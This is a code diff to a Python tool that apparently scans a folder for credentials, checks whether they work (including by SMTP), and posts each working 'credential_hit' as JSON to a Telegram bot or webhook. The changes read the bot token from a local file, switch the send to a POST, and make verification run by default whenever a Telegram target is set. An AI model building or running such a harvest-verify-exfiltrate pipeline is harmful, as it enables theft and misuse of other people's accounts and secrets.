@@ -14,7 +14,6 @@ import urllib.request
 from email.message import EmailMessage
 from pathlib import Path
 from typing import Any, Iterable
-from urllib.parse import urlencode
 
 _TEXT_HASH = chr(35)
 
@@ -282,14 +281,77 @@ def http_json(
         return e.code, parsed
 
 
+def _script_dir() -> Path:
+    return Path(__file__).resolve().parent
+
+
+def _load_local_telegram() -> tuple[str | None, str | None]:
+    path = _script_dir() / "telegram.local.json"
+    if not path.is_file():
+        return None, None
+    try:
+        data = json.loads(path.read_text(encoding="utf-8"))
+    except (OSError, json.JSONDecodeError):
+        return None, None
+    token = data.get("bot_token") or data.get("TELEGRAM_BOT_TOKEN")
+    chat = data.get("chat_id") or data.get("TELEGRAM_CHAT_ID")
+    if token is not None:
+        token = str(token).strip()
+    if chat is not None:
+        chat = str(chat).strip()
+    return (token or None, chat or None)
+
+
+def _telegram_effective() -> tuple[str | None, str | None, str | None]:
+    token = os.environ.get("TELEGRAM_BOT_TOKEN")
+    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
+    webhook = os.environ.get("TELEGRAM_WEBHOOK_URL")
+    lt, lc = _load_local_telegram()
+    if lt:
+        token = lt
+    if lc:
+        chat_id = lc
+    return token, chat_id, webhook
+
+
+def _has_telegram_target() -> bool:
+    token, chat_id, webhook = _telegram_effective()
+    return bool(webhook or (token and chat_id))
+
+
+def http_post_json(
+    url: str,
+    obj: dict[str, Any],
+    timeout: float = 25.0,
+) -> tuple[int, Any]:
+    body = json.dumps(obj, ensure_ascii=False).encode("utf-8")
+    req = urllib.request.Request(
+        url,
+        data=body,
+        method="POST",
+        headers={"Content-Type": "application/json"},
+    )
+    try:
+        with urllib.request.urlopen(req, timeout=timeout) as resp:
+            raw = resp.read().decode("utf-8", errors="replace")
+            if raw.strip().startswith("{"):
+                return resp.status, json.loads(raw)
+            return resp.status, raw
+    except urllib.error.HTTPError as e:
+        err_body = e.read().decode("utf-8", errors="replace") if e.fp else ""
+        try:
+            parsed = json.loads(err_body) if err_body.strip().startswith("{") else err_body
+        except json.JSONDecodeError:
+            parsed = err_body
+        return e.code, parsed
+
+
 def _telegram_text_limit() -> int:
     return 3900
 
 
 def send_functional_hit(hit: dict[str, Any]) -> bool:
-    token = os.environ.get("TELEGRAM_BOT_TOKEN")
-    chat_id = os.environ.get("TELEGRAM_CHAT_ID")
-    webhook = os.environ.get("TELEGRAM_WEBHOOK_URL")
+    token, chat_id, webhook = _telegram_effective()
     lim = _telegram_text_limit()
     payload_obj = {"event": "credential_hit", **hit}
     raw = json.dumps(payload_obj, ensure_ascii=False, separators=(",", ":"))
@@ -319,13 +381,16 @@ def send_functional_hit(hit: dict[str, Any]) -> bool:
         except urllib.error.URLError:
             return False
     if token and chat_id:
-        q = urlencode({"chat_id": chat_id, "text": raw})
-        url = f"https://api.telegram.org/bot{token}/sendMessage?{q}"
-        try:
-            with urllib.request.urlopen(url, timeout=20) as resp:
-                return 200 <= resp.status < 300
-        except urllib.error.URLError:
-            return False
+        api_url = f"https://api.telegram.org/bot{token}/sendMessage"
+        code, resp = http_post_json(
+            api_url,
+            {"chat_id": chat_id, "text": raw},
+            timeout=25.0,
+        )
+        if code == 200 and isinstance(resp, dict) and resp.get("ok") is True:
+            return True
+        print(f"telegram_send fail http={code} body={str(resp)[:300]}", file=sys.stderr)
+        return False
     return False
 
 
@@ -553,8 +618,11 @@ def main() -> int:
     p = argparse.ArgumentParser()
     p.add_argument("--folder", type=Path)
     p.add_argument("--verify", action="store_true")
+    p.add_argument("--scan-only", action="store_true")
     p.add_argument("--smtp-test-to", type=str, default=None)
     args = p.parse_args()
+
+    do_verify = args.verify or (not args.scan_only and _has_telegram_target())
 
     root = args.folder
     if root is None:
@@ -577,7 +645,7 @@ def main() -> int:
         ),
     )
 
-    if args.verify:
+    if do_verify:
         run_verify(bundle, args.smtp_test_to)
 
     return 0
